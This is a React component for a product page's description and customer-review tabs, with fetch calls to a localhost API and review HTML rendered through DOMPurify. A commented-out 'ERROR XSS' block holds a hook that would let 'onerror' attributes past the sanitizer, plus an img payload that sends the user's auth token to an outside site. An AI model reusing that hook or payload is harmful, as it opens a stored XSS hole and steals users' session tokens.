import React, { useState, useEffect } from 'react';
import './DescriptionReviewBox.css';
import authService from '../../services/auth.service.js';
import Pagination from '../Pagination/Pagination';
import EditReview from '../EditReview/EditReview';
import { format } from 'date-fns';
import { errorToast, successToast } from '../Notification/Notification';
import DOMPurify from 'dompurify';

const DescriptionReviewBox = ({ product }) => {
    //tab switching
    const [activeTab, setActiveTab] = useState('description');
    const handleTabSwitch = (tab) => {
        setActiveTab(tab);
    };

    //new review
    const [newReview, setNewReview] = useState({
        Rating: 5,
        Content: '',
    });

    const handleInputChange = (e) => {
        setNewReview({
            ...newReview,
            [e.target.name]: e.target.value,
        });
    };

    const handleRating = (Rating) => {
        setNewReview((prevReview) => ({
            ...prevReview, 
            Rating, 
        }));
    };
  
    //get all reviews
    const [allReviews, setAllReviews] = useState([]); 
    const handleAllReviews = async () => {
        try {
            const response = await fetch(`http://localhost:4000/review/${product.ProductId}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                }
            })
    
            const data = await response.json();
            
            if (data.success) {
                setAllReviews(data.data);
            } else {
                errorToast(data.message);
            }
        } catch (error) {
            errorToast(error.message);
        }
    };

    //get user review
    const [userReviews, setUserReviews] = useState([]); 
    useEffect(() => {}, [newReview]);
    const handleUserReviews = async () => {
        try {
            const token = authService.getExpiredItem('auth-token');
            const response = await fetch(`http://localhost:4000/review/${product.ProductId}/user`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`,
                }
            })
    
            const data = await response.json();
            
            if (data.success) {
                setUserReviews(data.data); 
            } else {
                errorToast(data.message);
            }
        } catch (error) {
            errorToast(error.message);
        }
    };

    //useEffect
    useEffect(() => {
        if (product && product.ProductId) {
            handleAllReviews();
        }

        if(localStorage.getItem('auth-token')){
            handleUserReviews();
        }
    }, [product.ProductId]);


    //add review
    const handleSubmitReview = async(e) => {
        e.preventDefault();

        if (!newReview.Content.trim()) {
            errorToast('Please enter your review!');
            return;
        }

        try {
            const token = authService.getExpiredItem('auth-token');
            const response = await fetch(`http://localhost:4000/review/${product.ProductId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'Authorization': `Bearer ${token}`,
                },
                body: JSON.stringify(newReview),
            })
    
            const data = await response.json();
            
            if (data.success) {
                setAllReviews(data.data);
                
                setNewReview({
                    Rating: 5,
                    Content: ''
                });
                
                successToast(data.message);
                
                handleUserReviews();
            } else {
                errorToast(data.message);
            }
            
            setAllReviews([...allReviews, newReview]);
            handleAllReviews();
        } catch (error) {
            errorToast(error.message);
        }
    };

    //edit product popup
    const [isEditPopupOpen, setIsEditPopupOpen] = useState(false);
    const [currentEditReview, setCurrentEditReview] = useState(null);

    const openEditPopup = (review) => {
        setCurrentEditReview({...review});
        setIsEditPopupOpen(true);
    };

    //delete review
    const handleDeleteReview = async(review) => {
        try {
            const token = authService.getExpiredItem('auth-token');
            const response = await fetch(`http://localhost:4000/review/${review.ReviewId}`, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'Authorization': `Bearer ${token}`,
                },
            })
    
            const data = await response.json();
            
            if (data.success) {
                setAllReviews(data.data);
                successToast(data.message);
            } else {
                errorToast(data.message);
            }
            setAllReviews([...allReviews]);
            handleAllReviews();
        } catch (error) {
            errorToast(error.message);
        }
    };

    //pagination
    const [currentPage, setCurrentPage] = useState(1);
    const reviewsPerPage = 5; 

    const indexOfLastReview = currentPage * reviewsPerPage;
    const indexOfFirstReview = indexOfLastReview - reviewsPerPage;
    const currentReviews = allReviews.slice(indexOfFirstReview, indexOfLastReview);

    const totalPages = Math.ceil(allReviews.length / reviewsPerPage);

    const paginate = (pageNumber) => setCurrentPage(pageNumber);

    /*
    //ERROR XSS
    DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
        if (data.attrName === 'onerror') {
            data.allowedAttributes[data.attrName] = true;
        }
    });
    //<img onerror="window.location.href='https://phoneky.co.uk?token=' + localStorage.getItem('auth-token')" src="invalid-image" />
    //ERROR XSS
    */

    return (
        <div className='descriptionReview'>
            <div className='descriptionReview-navigator'>
                <div 
                    className={`descriptionReview-nav-box ${activeTab === 'description' ? '' : 'fade'}`}
                    onClick={() => handleTabSwitch('description')}
                >
                    Description
                </div>

                <div 
                    className={`descriptionReview-nav-box ${activeTab === 'reviews' ? '' : 'fade'}`}
                    onClick={() => handleTabSwitch('reviews')}
                >
                    Reviews ({allReviews.length})
                </div>
            </div>
    
            {activeTab === 'description' 
                ? <div className='descriptionReview-description'>
                    {product && product.Description 
                        ? <p>{product.Description}</p>
                        : <div></div>
                    }
                </div>
                : <div className='descriptionReview-reviews'>
                    {/* Existing Reviews */}
                    <div className='existing-reviews'>
                        <h3>Customer Reviews</h3>
                        <div className='reviews'>
                            {currentReviews.map((review, index) => (
                                <div key={index} className="review-container">
                                    <div className='review-user'>{review.User}</div>
                                    <div className='review-date'>
                                        {review.UpdatedAt || review.CreatedAt 
                                            ? format(new Date(review.UpdatedAt || review.CreatedAt), 'yyyy-MM-dd HH:mm:ss')
                                            : review.CreatedAt}
                                    </div>
                                    <div className='review-star'>
                                        {'★'.repeat(review.Rating)}
                                        {'☆'.repeat(5 - review.Rating)}
                                    </div>
                                    
                                    <div className='user-review'>
                                        <div
                                            className='review-text'
                                            dangerouslySetInnerHTML={{ '__html': DOMPurify.sanitize(review.Content) }}
                                        ></div>

                                        {userReviews.some(userReview => userReview.ReviewId === review.ReviewId) && (
                                        <div className='review-actions'>
                                            <div
                                                onClick={() => openEditPopup(review)}
                                                className='edit-review-btn'
                                            >
                                                <i className='fa-regular fa-pen-to-square' />
                                            </div>
                                            <div
                                                onClick={(e) => {
                                                    e.preventDefault()
                                                    handleDeleteReview(review)
                                                }}
                                                className='delete-review-btn'
                                            >
                                                <i className='fa-solid fa-trash' />
                                            </div>
                                        </div>
                                    )}  
                                    </div>
                                </div>
                            ))}
                        </div>

                        {/* Edit product popup */}
                        {isEditPopupOpen && currentEditReview && (
                            <EditReview
                                review={currentEditReview}
                                onClose={() => setIsEditPopupOpen(false)}
                                handleAllReviews={handleAllReviews}
                            />
                        )}

                        {/* Pagination Controls */}
                        <Pagination 
                            currentPage={currentPage} 
                            totalPages={totalPages} 
                            paginate={paginate} 
                        />
                    </div>
        
                    {/* Add New Review Form */}
                    <div className='add-review'>
                        <h3>Write a Review</h3>
                        <form onSubmit={handleSubmitReview}>
                            <div className='form-group'>
                                <label htmlFor='rating'>Rating</label>
                                <div className='star-rating'>
                                    {[...Array(5)].map((_, index) => (
                                        <span 
                                            key={index} 
                                            className={index < newReview.Rating ? 'star filled' : 'star'} 
                                            onClick={() => handleRating(index + 1)}
                                        >
                                            ★
                                        </span>
                                    ))}
                                </div>
                            </div>

                            <div className='form-group'>
                                <label htmlFor='content'>Your Review</label>
                                <textarea
                                    id='content'
                                    name='Content'
                                    value={newReview.Content}
                                    onChange={handleInputChange}
                                    required
                                ></textarea>
                            </div>

                            <button type='submit' className='submit-review'>Submit Review</button>
                        </form>
                    </div>
                </div>
            }
        </div>
    );
};

export default DescriptionReviewBox;
